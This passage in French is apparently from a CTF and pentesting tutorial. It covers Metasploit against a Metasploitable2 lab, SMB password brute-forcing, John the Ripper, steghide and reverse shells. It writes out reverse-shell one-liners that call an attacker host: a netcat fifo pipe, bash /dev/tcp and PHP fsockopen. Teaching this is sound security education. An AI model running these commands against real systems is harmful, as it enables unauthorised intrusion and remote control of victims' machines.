+<img src="oui/Ancien/imangeancien/metasploit/searchsploit-ex2.PNG" alt="Recherche en fonction de la version" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Recherche en fonction de la version<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Cela permettra de cibler plus facilement l’exploit à utiliser. Enfin, il faut savoir que tous les exploits présentés avec la commande <strong>searchsploit</strong> ne sont pas tous des exploits utilisables avec Metasploit. En effet, tous les exploits codés n’ont pas été faits pour Metasploit. On peut y retrouver des exploit en python ou encore en C. Cependant, tous les exploits compatibles avec metasploit auront la mention <strong>(metapsloit)</strong> dans leur nom lors de la recherche avec <strong>searchsploit</strong>.</p>
+<p>Comme nous l’avons dit en introduction, Metasploit utilise des modules pour fonctionner. Dans cette partie, nous allons voir comment les utiliser dans le cadre d’un audit de sécurité ou sur un CTF. La partie des modules est décomposée en 5 sous-parties qui sont :<br />
+- <strong>Exploit</strong>: Un exploit est le moyen par lequel un pentester exploite une faille, un défaut dans un logiciel ou un service. Ainsi, un attaquant peut utiliser un exploit pour attaquer un système d’informations et générer ainsi un résultat que les développeurs n’ont pas pris en compte. Les exploits les plus courants sont le débordement de tampon (buffer overflow), les vulnérabilités Web (injection SQL, défaillances XSS) et enfin les erreurs de configuration dans un logiciel.</p>
+<p>- <strong>Payloads</strong>: Un payload ou charge utile est un code qui sera exécuté par le système. Dans cette partie, on peut y retrouver tout type de payload comme le reverse shell, c’est le fait de créer une connexion depuis la cible vers l’attaquant. De plus, Metasploit permet de regrouper les payloads en fonction du système d’exploitation (OS) de la machine victime.</p>
+<p>- <strong>Encoders</strong>: C’est un module de metasploit permettant d’encoder des payloads ou des shellcode dans le but d’outrepasser la détection antivirus et les IDS. En effet, en encodant plusieurs fois un code malveillant, l’antivirus de la machine cible devra faire beaucoup de calculs avant de détecter le virus. Pour faire ses analyses, un antivirus place le programme à analyser dans une sandbox (machine virtuelle isolée de l’hote) dans laquelle il va faire ses analyses. Cependant, lors d’une analyse régulière du système, l’antivirus devra analyser des milliers de fichiers. Il ne peut pas se permettre de passer trop de temps sur un fichier en particulier.</p>
+<p>- <strong>Nops</strong>: En langage assembleur, NOP est l’abréviation de No Operation. Le NOP permet de garder une taille de payload constante en s’assurant que tout espace non utilisé par un autre code sera toujours valablement exécutable par le processeur. En effet, lors de l’écriture d’un payload ou d’un shellcode, les NOP permettent de régler la problématique des sauts d’instructions en assembleur. Cette partie est utilisée lors de la programmation d’exploit ou de payload pour metasploit.</p>
+<p>- <strong>AUX</strong>: "AUX" correspond aux modules auxiliaires de metasploit. Comme par exemple les scans de ports, de versions de services en utilisant NMAP.</p>
+<p>Ce qui peut être très intéressant avec cet outil, c’est de combiner l’utilisation de NMAP et de Metasploit. En effet, NMAP permet de trouver des versions de services. Il nous suffit de chercher de versions vulnérable avec Metasploit. Comme nous l’avons vu précédemment, on peut utiliser la commande <strong>searchsploit</strong>. Si cela ne suffit pas, on peut chercher des exploits sur le net et les importer dans Metasploit. Pour utiliser un exploit, il suffit de faire la commande <strong>use exploit/le_chemin_de_l’exploit</strong>. On peut également utiliser <strong>use</strong> pour utiliser tous les modules de Metasploit tel que le module auxiliaire avec <strong>use auxiliary/chemin_du_programm</strong>.<br />
+Pour rechercher un exploit directement dans metasploit afin de l’utiliser, on utilise la commande <strong>search</strong>. Cette commande va chercher tous les exploits disponibles dans Metasploit pour l’argument passé en paramètre.<br />
+On reprenant l’exemple de la section précédente, on aurait pu faire ceci:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/search.PNG" alt="Search ftp" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Search ftp<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Cette capture donne le "chemin" de tous les exploits en rapport avec FTP 3.0.</p>
+<p>Pour cette exemple, nous allons voir comment exploiter un service vulnérable avec Metasploit. La machine cible sera une machine metasploitable2 conçu pour être vulnérable à beaucoup d’attaques:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/schema.png" alt="Schéma de la maquette" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Schéma de la maquette<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Il suffit d’utiliser NMAP pour scanner la machine:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/nmap.PNG" alt="NMAP dans Metasploit" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>NMAP dans Metasploit<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Ensuite on peut chercher des exploits sur <strong>vsftpd 2.3.4</strong>:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/ftp.PNG" alt="search vsftpd 2.3.4" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>search vsftpd 2.3.4<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On constate qu’il existe un exploit pour effectuer un reverse shell sur la machine. On va donc l’utiliser avec la commande <strong>use</strong>:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/ftp5.PNG" alt="use exploit" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>use exploit<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut utiliser la commande <strong>show options</strong> pour voir les options de cet exploit:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/ftp3.PNG" alt="Show options" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Show options<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On constate que nous devons renseigner un <strong>RHOST</strong>(Remote Host) qui correspond à la machine victime. On utilise la commande <strong>set RHOST</strong> pour éditer une option. Pour cet exemple, nous allons faire <strong>set RHOST 192.168.1.54</strong>. Une fois fait, on peut regarder à nouveau les options :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/ftp3.PNG" alt="Set RHOST" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>Set RHOST<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On constate que le champ <strong>RHOST</strong> a bien été renseigné. On peut à présent lancer l’exploit avec la commande <strong>exploit</strong>:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/metasploit/ftp4.PNG" alt="Lancement de l’exploit" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Lancement de l’exploit<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On s’aperçoit que l’exploit s’est bien exécuté sur la machine cible. Nous avons donc un reverse shell sur la machine distante.</p>
+<p>Dans le cas d’un CTF qui utilise un serveur Samba par exemple, Metasploit peut être très utile pour énumérer la liste des utilisateurs du serveur Smb. Metasploit possède un module de scan permettant de faire cela. Il se trouve dans <strong>auxiliary/scanner/smb</strong> (voir <strong>figure <a href="#fig:smb-enum" data-reference-type="ref" data-reference="fig:smb-enum">1.57</a></strong>)<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/msf_smb_enum.PNG" alt="Utilisation du module smb_enum" id="fig:smb-enum" style="width:80.0%" /><figcaption>Utilisation du module smb_enum<span label="fig:smb-enum"></span></figcaption>
+</figure>
+<p>Il nous suffit de renseigner le champ "rhosts" qui correspond à l’adresse IP de la machine victime. Ensuite on tape "exploit" pour lancer le module. En quelques secondes, nous récupérons un utilisateur nommé "helios" qui est un utilisateur du serveur Samba.<br />
+On peut également récupérer le mot de passe avec une attaque par dictionnaire disponible avec un autre module nommé <strong>smb_login</strong> comme indiqué dans la <strong>figure <a href="#fig:attaque-smb-dic" data-reference-type="ref" data-reference="fig:attaque-smb-dic">1.58</a></strong></p>
+<figure>
+<img src="oui/Ancien/imangeancien/msf_smb_pass.PNG" alt="Attaque par dictionnaire smb" id="fig:attaque-smb-dic" style="width:90.0%" /><figcaption>Attaque par dictionnaire smb<span label="fig:attaque-smb-dic"></span></figcaption>
+</figure>
+<p>Enfin, il faut renseigner l’utilisateur avec lequel on veut trouver le mot de passe ainsi qu’un dictionnaire à utiliser. Dans notre cas, nous allons utiliser le dictionnaire "rockyou" qui est un dictionnaire comprenant 14.344.392 lignes (voir <strong>figure <a href="#fig:smb-dic-2" data-reference-type="ref" data-reference="fig:smb-dic-2">1.59</a></strong>)<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/msf_smb_pass2.PNG" alt="Attaque par dictionnaire smb" id="fig:smb-dic-2" style="width:90.0%" /><figcaption>Attaque par dictionnaire smb<span label="fig:smb-dic-2"></span></figcaption>
+</figure>
+<p>Metasploit a trouvé le mot de passe de l’utilisateur "helios" qui était "qwerty". On peut donc se connecter au serveur SMB avec notre utilisateur:</p>
+<figure>
+<img src="oui/Ancien/imangeancien/msf_smb_pass3.PNG" alt="Connexion au serveur SMB" id="fig:courbe-tikz" style="width:90.0%" /><figcaption>Connexion au serveur SMB<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<h1 id="quatrième-partie">Quatrième partie</h1>
+<h2 id="lintrusion-dans-le-système-cible">L’intrusion dans le système cible</h2>
+<p>Après avoir exploité les failles via les outils présentés dans la section précédente, il se pourrait que vous soyez dans l’un des cas suivants :</p>
+<ul>
+<li><p><strong>Caractères hashés</strong></p></li>
+<li><p><strong>Image contenant un fichier caché</strong></p></li>
+<li><p><strong>Possibilité d’effectuer un reverse-shell</strong></p></li>
+</ul>
+<p>Nous allons donc, pour chaque cas ci-dessus, vous expliquer les outils qui vous permettront d’avancer dans un CTF.</p>
+<p>Après avoir exploité une faille SQL par exemple, il se pourrait que les mots de passes des utilisateurs soient hashés. C’est pourquoi nous allons vous présenter l’outil John The Ripper.</p>
+<p>John The Ripper ou plus communément, John, est un utilitaire multi-plateformes ayant pour principal objectif de casser des mots de passe. John est certainement le programme le plus utilisé pour la sécurité de mot de passe. John a plusieurs fonctionnalités. En effet, dans un premier temps, il est capable de reconnaître un hash donné. Cette fonctionnalité pourra nous être utile lors de CTF pour savoir comment recoder une information modifiée par exemple. Ensuite, en fonction du hash qu’il a reconnu et des options qu’on lui a associé, John est capable de trouver un mot de passe associé à un utilisateur. Nous allons donc nous pencher sur son fonctionnement.</p>
+<p>Comme nous l’avons vu dans la partie de Dirb, il existe une différence entre une attaque par dictionnaire et une attaque par bruteforce. Ici, John a la possibilité de faire 4 différents types d’attaques que nous allons détailler.<br />
+<strong>Attaque via single mode</strong><br />
+Ce mode est le mode par défaut de cassage de mot de passe sur John. Cette attaque va tester tous les mots de passe basiques que nous avons l’habitude d’utiliser en fonction du nom d’utilisateur. Regardons un exemple très simple. Nous allons hasher le mot de passe ‘ user1999 ‘ et ‘ salon ‘ pour les utilisateurs respectifs ‘ user1 ‘ et ‘ user2 ‘ via un site web. Ensuite, nous allons enregistrer ceci dans un fichier texte sous ce format :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/format_txt.PNG" alt="Format d’utilisation pour John" id="fig:courbe-tikz" style="width:50.0%" /><figcaption>Format d’utilisation pour John<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous pouvons à présent lancer John sans option en lui précisant juste le fichier à attaquer puis observer le résultat de l’attaque :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/affichage_mdp_single.PNG" alt="John par défaut" id="fig:courbe-tikz" style="width:80.0%" /><figcaption>John par défaut<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Dans un premier temps, on retrouve la première phase de John qui est l’analyse du hash. Il détecte dans notre cas que les mots de passe sont hashés en SHA1. Il va alors essayer de reconnaître des mots de passe qu’il avait déjà trouvé à partir de cet hôte et des mots de passe ressemblants à l’utilisateur. Puis dans une seconde partie, John n’a pas su trouver le mot de passe ‘salon’ associé à user2. Il a dû donc procéder à une attaque par mode incrémental. Pour éviter cela, on aurait pu forcer John à rester sur le single mode avec l’option ’ –single ’.<br />
+<strong>Attaque par dictionnaire</strong><br />
+Comme nous l’avons vu avec l’outil Dirb, qui fait une attaque par dictionnaire, le principe sera ici le même. John va se baser sur un dictionnaire afin de trouver le mot de passe. En effet, le dictionnaire va être utilisé en fonction des règles que John aura reçues. Ainsi, si le mot de passe correspond aux règles combinées au dictionnaire, John pourra nous donner le mot de passe. Nous allons essayer ce concept avec le dictionnaire ‘rockyou.txt’ fourni par Kali :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/Dico.PNG" alt="Attaque avec dictionnaire" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Attaque avec dictionnaire<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’attaque a été très rapide car le dictionnaire fourni par Kali est très complet. Nous pouvons maintenant voir l’attaque via le mode incrémental.<br />
+<strong>Attaque via le mode incrémental</strong><br />
+Le mode incrémental est un mode permettant de tester toutes les combinaisons possibles afin d’arriver à nos fins. C’est le moyen ultime pour obtenir un mot de passe car il fonctionnera toujours. Mais il ne faudra pas être pressé car, plus le mot de passe sera long, plus ce mode prendra du temps. Nous allons rajouter un ‘ user3 ‘ avec pour mot de passe ‘ velizy78 ’ pour que le mode simple soit incapable de le trouver. Nous allons juste indiquer à John d’utiliser directement le mode incrémental sans option. Cependant, après plusieurs minutes, John n’avait pas trouvé et avait crashé. Nous allons donc faciliter la recherche de John en lui annonçant que nous savons quels sont les types de caractères à rechercher. En effet, le mode incrémental a des options que nous allons observer. L’option ‘ alpha ‘ va nous permettre de rechercher les mots de passe avec les lettres du clavier :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/incremental_alpha.PNG" alt="Attaque en mode incrémental alphabet" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Attaque en mode incrémental alphabet<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’option "digit" va nous permettre de rechercher les mots de passe avec les chiffres du clavier :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/incremental_digits.PNG" alt="Attaque en mode incrémental chiffre" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Attaque en mode incrémental chiffre<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’option ‘ ASCII ‘ va nous permettre d’utiliser l’alphabet ASCII qui regroupe presque la totalité du clavier :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/john/incremental_ASCII.PNG" alt="Attaque en mode incrémental ASCII" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Attaque en mode incrémental ASCII<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme on peut le voir, plus le champ de recherche est important, plus le mot de passe prend du temps à être trouvé.<br />
+Cet outil, très complet, vous permettra donc de résoudre des CTFs dont la finalité est de casser un hash.</p>
+<p>A la suite de l’exploitation d’une failles via Metasploit ou encore Burpsuite, il se pourrait que vous puissiez télécharger une image. Peu banal mais efficace, l’image pourrait renfermer un fichier contenant peut être des identifiants et mots de passes. C’est pour cette raison que nous allons vous présenter l’outil Steghide.</p>
+<p>Steghide est un programme de stéganographie permettant de masquer des données dans des fichiers image et audio. Il présente plusieurs fonctionnalités :<br />
+- Compression des données incorporées.<br />
+- Cryptage des données incorporées.<br />
+- Incorporation d’une somme de contrôle pour vérifier l’intégrité des données extraites.<br />
+- Prise en charge des fichiers JPEG, BMP, WAV, AU.<br />
+Les fichiers JPEG et BMP correspondent à des fichiers image tandis que les fichiers WAV et AU correspondent à des fichiers audio.<br />
+Cet outil est sous licence GNU General Public License (GPL), ce qui veut dire qu’il est possible d’effectuer des modifications et en faire la distribution de ce programme tant qu’il rentre dans les conditions de la GPL. On va d’abord voir comment intégrer un fichier texte dans un fichier image. Bien évidemment, il faut créer au préalable un fichier texte contenant un message.</p>
+<p>Pour intégrer notre fichier texte [fichier].txt, il faut entrer la commande :</p>
+<p><strong>steghide embed -cf [fichier].jpeg -ef [fichier].txt</strong></p>
+<p>On ajoute ensuite un mot de passe pour permettre l’accès à ce fichier caché. L’option -ef (–embedfile) permet l’intégration du fichier désiré dans le fichier ciblé. L’option -cf (–coverfile) permet de spécifier le nom du fichier à incorporer.<br />
+Bien sûr, on peut mettre ce que l’on veut comme type de texte. Par exemple, dans notre attaque Kuya:1, lors de l’extraction d’un fichier caché dans une image, on a pu retrouver un fichier texte affichant un code de type "Brain fuck":<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/steghide/STG3.png" alt="Code &quot;Brain Fuck&quot;" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Code "Brain Fuck"<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>C’est un type de code original à intégrer pour rendre la capture du flag un peu plus amusante et plus complexe. Pour vérifier que le fichier cible a bien incorporé le message secret, on peut taper la commande visible en <strong>figure <a href="#fig:steghideinfo" data-reference-type="ref" data-reference="fig:steghideinfo">1.68</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/steghide/STG2.png" alt="steghide info [fichier].jpeg" id="fig:steghideinfo" style="width:100.0%" /><figcaption>steghide info [fichier].jpeg<span label="fig:steghideinfo"></span></figcaption>
+</figure>
+<p>Comme on peut le voir, le fichier picture.jpg est incorporé dans un message crypté nommé secret.txt. Maintenant, on va extraire le fichier caché avec la commande <strong>figure <a href="#fig:steghideextract" data-reference-type="ref" data-reference="fig:steghideextract">1.69</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/steghide/STG1.png" alt="steghide extract -sf [fichier].txt" id="fig:steghideextract" style="width:100.0%" /><figcaption>steghide extract -sf [fichier].txt<span label="fig:steghideextract"></span></figcaption>
+</figure>
+<p>L’option -sf (–stegofile) permet de spécifier le “stego file” (fichier contenant les informations incorporées).En affichant ensuite le contenu du fichier texte dont on a extrait le message caché, on peut donc enfin le visualiser.<br />
+En conclusion, cet outil simple est pratique pour récupérer des messages cachés dans des fichiers pris en charge. Cependant, son niveau d’utilisation reste assez restreint car il ne prend en charge que très peu de formats de fichiers. Steghide sera donc généralement utilisé en début et fin d’attaque CTF car il peut contenir des indications comme des résolutions de flags.</p>
+<p>Le reverse-shell qui signifie shell inversé est le moyen le plus fiable d’accéder aux données de la cible et de devenir administrateur de cette dernière. Cette technique consiste à faire parvenir au hacker un shell via un serveur ouvert et ainsi contourner toutes les sécurités mises en place. Cependant, avant de comprendre comment fonctionne un reverse-shell, il va nous falloir étudier un shell.<br />
+Comme on peut le voir sur les systèmes d’exploitations installés sans GUI (Graphical User Interface), notre seul moyen de communiquer avec la machine est un invite de commande. Cet interpréteur de commande nous permet d’exécuter des commandes qui sont elles mêmes des scripts capables d’afficher le résultat de la commande saisie à l’écran. Cet interpréteur est donc un programme que l’on nomme shell. Il ne faut pas confondre le shell avec le kernel qui est le noyau du système d’exploitation. Le shell permet donc à l’utilisateur d’exploiter ce noyau à travers des lignes de commandes. Nous pouvons alors synthétiser ceci en disant que le shell permet à l‘utilisateur de demander quelque chose à son noyau. Nous pouvons, grâce à cette définition comprendre le fonctionnement du reverse-shell soit du shell-inversé.<br />
+Le reverse-shell consiste à inverser les commandes de sorties et d’entrées du shell afin que ce soit au noyau de nous demander des informations pour afficher des résultats, et non l’inverse. Ainsi, les requêtes seront envoyées de la machine cible, passeront le firewall s’il existe, et arriveront à notre machine. Nous aurons alors la possibilité, comme sur un formulaire web, de remplir nos informations et de les renvoyer au serveur comme une simple réponse avec une très grande conséquence. Ce sera donc par ce moyen que nous arriverons à contourner les sécurités et nous introduire dans le système cible. Voici un schéma explicant le fonctionnement d’un reverse-shell:</p>
+<figure>
+<img src="oui/images/Reverse_shell-meterpreter/reverse-shell.PNG" alt="Mise en place d’un reverse-shell" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Mise en place d’un reverse-shell<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Maintenant que nous avons introduit le concept du reverse-shell, il est venu le temps de présenter l’aspect technique de ce dernier.</p>
+<p><strong>Les étapes d’un reverse-shell</strong><br />
+Lors d’une attaque sur CTF ou lors d’une réelle séance de hacking, il existe plusieurs grandes étapes obligatoires à passer comme vous l’avez vu lors des chapitres précédents. La détection et l’exploitation d’une faille va en général nous permettre d’écrire dans le langage informatique exploité. Il est important de savoir que tous les langages informatiques se doivent de parler avec le kernel afin de fonctionner. Il est donc essentiel à un langage de pouvoir exploiter des lignes de commandes. Nous passerons donc principalement par cette voie pour ouvrir notre port TCP ou UDP sur la machine cible. Cependant, pour qu’une connexion se mette en place et que le socket fonctionne, il est important que notre machine écoute sur le port que nous allons ouvrir. Ce pourquoi nous allons introduire le logiciel Netcat.<br />
+<strong>Netcat</strong><br />
+Netcat est un logiciel réseau permettant l’ouverture de ports et le scan de ports en TCP et UDP. Surnommé “Le couteau suisse TCP”, cet utilitaire polyvalent et discret est utilisé en arrière plan d’autres applications afin d’effectuer des recherches de ports par exemple. Cependant, son principale rôle est l’ouverture de socket entre un client et un serveur. Un socket est la combinaison de l’adresse IP et du port permettant à un programme de communiquer avec autre un programme, distant, sur une machine spécifique. Donc Netcat va nous permettre de créer un socket ou d’écouter sur l’un de nos ports. C’est la deuxième option qui va nous intéresser dans un premier temps, lors d’un reverse-shell. En effet, Netcat va pouvoir écouter ce que le shell cible va lui renvoyer sur un port bien spécifique :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/netcat_lvp.PNG" alt="Ecoute de port Netcat" id="fig:courbe-tikz" style="width:60.0%" /><figcaption>Ecoute de port Netcat<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme on peut le voir ci-dessus, Netcat peut être noté ‘nc’. Avec les options associées à Netcat, on s’aperçoit que le programme écoute de la part de tout le monde sur le port 5555. Regardons ces options de plus près :<br />
+1) ‘ -l ‘ pour listen, est l’option de nc permettant d’activer le mode écoute.<br />
+2) ‘-v ‘ ou ‘-vv’ est le mode verbose. Cela signifie qu’il va afficher toutes les informations de retour telles que : “listening on [any] 5555 . . . “<br />
+3) ‘-p’ est l’option d’ouverture de ports.<br />
+Une fois cette commande lancée, nous pourrons laisser de côté ‘ nc -l ’ et nous focaliser sur l’ouverture du reverse-shell sur la machine cible.<br />
+En cas d’échec de connexion, il se pourrait que la cible n’ait pas la bonne version de Netcat. Il est possible de contourner le problème en réalisant la commande suivante dans la faille :</p>
+<p><strong>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</strong></p>
+<p>Comme nous l’avons vu précédemment, il faut avoir trouvé une faille pour mettre en place un reverse-shell. Il existe donc des reverse-shell qui seront plus faciles à ouvrir dans certaines situations que d’autres. Netcat fait partie, comme nous l’avons vu plus tôt, des reverse-shell car il peut créer un socket en envoyant le shell à un utilisateur distant. C’est pourquoi nous allons nous intéresser aux différents types de reverse-shell.</p>
+<p><strong>Netcat-reverse</strong><br />
+Imaginons qu’une faille nous permet d’utiliser un ‘ echo ‘ dans le terminal cible, nous pourrons alors appliquer netcat en ouverture de port comme ci-dessous :<br />
+</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/reverse_netcat.PNG" alt="Reverse Netcat en localhost" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Reverse Netcat en localhost<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>L’option ‘ -e ‘ ou ‘ -c ‘ de Netcat va nous permettre d’exécuter un programme chez un utilisateur distant sur un port donné. Ici, le programme annoncé est : ‘ /bin/sh ‘, soit le shell.<br />
+Ce type de reverse-shell est extrêmement rapide à mettre en place dès qu’une faille est apparente car les commandes sont intuitives. Cependant, l’attaquant ne reçoit aucune informations au niveau du ‘ tty ‘. Un ‘ tty ‘ est une console virtuelle qui permet de taper des lignes de commandes. Il va donc falloir l’importer afin d’obtenir un reverse-shell digne de ce nom :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/tty_importation_python.PNG" alt="Importation d’un TTY" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Importation d’un TTY<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Pour remédier à ce problème, nous avons importer des commandes shell grâce à Python. Python est un langage informatique basé sur le C. Son argument ‘ -c ‘ va nous permettre de directement taper du Python sur la même ligne de commande. Le code qui suit est très simple car son fonctionnement est sa propre lecture traduite en français. Ceci nous donne : “ Importe le module pty puis, dans ce dernier, utilise la fonction spawn (faire apparaître) avec l’option ‘ /bin/bash ‘. Donc le module ‘ pty ‘ intègre une fonction qui permet de faire afficher des pseudo-terminaux avec le type de shell que l’on souhaite. Ici, nous avons choisi un bash-shell.<br />
+Nous obtenons à partir de ce point un bash-shell qui correspond au terminal de la cible. Nous nous sommes, à partir de ce moment précis, introduits pour la première fois au sein d’une machine cible !<br />
+<strong>Bash TCP</strong><br />
+Au sein de cette partie, nous allons utiliser du bash avec une ouverture de port sur un serveur TCP comme ceci :</p>
+<pre><code>    bash -i &gt;&amp; /dev/tcp/ip attaquant/port écoute 0&gt;&amp;1</code></pre>
+<p>Voici un cas d’application réel de ce reverse :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/Bash/localhost_bash_tcp_basique.PNG" alt="Reverse Bash localhost" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Reverse Bash localhost<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>On peut voir ici qu’en appliquant le reverse bash TCP sur la cible, nous avons pu nous connecter grâce à l’écoute de Netcat au shell ciblé.<br />
+Mais que signifie cette commande rentrée dans la machine cible ?<br />
+L’option ‘-i&gt;&amp;’ va nous permettre de retourner un bash interactif soit être en mode connecté.<br />
+‘/dev/tcp/ip attaquant/port écoute’ va annoncer à la cible à qui envoyer ce bash interactif et sur quel port à travers un socket TCP.<br />
+<code>0&gt;&amp;1</code> va nous permettre d’inverser les entrées et les sorties et ainsi créer le reverse-shell. Nous nous sommes ainsi introduits via le protocole TCP en bash dans la machine cible. Le protocole TCP est souvent associé au protocole UDP car ils sont presque similaires. La plus grosse différence, qui est majeure, est que TCP est en mode connecté et UDP en mode non connecté. Le mode connecté est un mode d’envoi et de réception de fichier qui a un " accusé-réception". Ceci signifie que le message est éparpillé dans le réseau en plusieurs paquets, avec un numéro qui leur est propre, et arrive chez le destinataire dans un ordre non défini. Cette méthode nécessite donc au destinataire de recomposer le message et de vérifier que tous les paquets sont bien arrivés. Si ce n’est pas le cas, ce dernier va pouvoir demander à l’envoyeur de lui renvoyer le ou les paquets manquants. C’est ce que l’on nomme le mode connecté. Le protocole UDP va se baser sur le mode non connecté. Cette méthode est l’équivalent du temps réel et se doit donc d’avoir une interaction directe entre les deux machines. Le message ne pourra donc pas être découpé ce qui implique un renvoi complet de ce dernier s’il est incomplet à la réception. Le protocole UDP est principalement utilisé dans les applications en temps réels car son faible temps de latence permet d’accéder aux contenus rapidement. Cependant, en ce qui concerne le reverse-shell, UDP n’est vraiment pas conseillé car ce protocole, ne vérifiant pas l’intégrité des trames, pourrait nous faire penser que nous nous sommes trompés alors que c’est UDP qui n’est pas fiable. C’est pour cette raison que TCP sera utilisé en reverse-shell.<br />
+<strong>PHP</strong><br />
+Le PHP est un langage de programmation Web couramment utilisé pour dialoguer avec la base de données ainsi que pour sécuriser les sites. A titre d’exemple, le HTML va permettre de créer un formulaire que l’utilisateur va remplir. Le PHP sera présent pour vérifier que toutes les conditions ont été respectées afin de valider le formulaire. On s’aperçoit donc que l’utilisateur communique directement avec le PHP. Il y donc des possibilités de réaliser des reverse-shell dans ce langage.<br />
+Nous pouvons tester le code PHP en localhost sur la <strong>figure <a href="#fig:phpreverse" data-reference-type="ref" data-reference="fig:phpreverse">1.75</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/PHP/php-reverse.PNG" alt="PHP-reverse" id="fig:phpreverse" style="width:100.0%" /><figcaption>PHP-reverse<span label="fig:phpreverse"></span></figcaption>
+</figure>
+<p>Le code PHP est le suivant :</p>
+<pre><code>     php -r &#39;\$s=fsockopen(&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;);exec(&quot;/bin/sh -i &lt;\&amp;3 &gt;\&amp;3 2&gt;\&amp;3&quot;);&#39;</code></pre>
+<p>Regardons ensemble cette commande afin de la comprendre :</p>
+<ul>
+<li><p>’php -r’ va nous permettre d’exécuter du code PHP en ligne de commande</p></li>
+<li><p>’php -r’ va nous permettre d’exécuter du code PHP en ligne de commande.</p></li>
+<li><p>’$s=fsockopen("&lt;IP&gt;",&lt;PORT&gt;);’ cette commande a pour but, à travers la variable $s, d’ouvrir un socket grâce à la fonction fsockopen().</p></li>
+<li><p>’exec ()’ est une fonction PHP permettant d’écrire dans le cmd.</p></li>
+</ul>
+<p>Il est donc assez facile de réaliser un reverse-shell en PHP si l’administrateur web n’a pas réaliser correctement son travail au niveau des failles XSS.<br />
+<strong>Python</strong><br />
+Au cours de cette partie, nous allons nous pencher sur le reverse-shell via le langage Python. Ce langage, basé principalement sur le C, se démocratise de plus en plus aujourd’hui. Certes, ce langage est lent, mais il va nous permettre grâce à sa grande ouverture d’exploiter toutes les failles informatiques.<br />
+Voyons un cas concret sur un reverse en localhost :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/Python/python-reverse.PNG" alt="Python-reverse" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Python-reverse<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Comme on peut le voir ci-dessus, le code est assez important. C’est pourquoi il est plus simple de le visualiser sous un éditeur de texte :</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Reverse-Shell/Python/python_code.PNG" alt="Python-reverse" id="fig:courbe-tikz" style="width:100.0%" /><figcaption>Python-reverse<span label="fig:courbe-tikz"></span></figcaption>
+</figure>
+<p>Nous comprenons alors qu’un script peut être créé assez facilement afin d’invoquer un reverse-shell chez une cible. Le code peut être lancé soit directement dans un invite de commande soit en invoquant un programme existant chez la cible comme nous l’avons fait ci-dessus.</p>
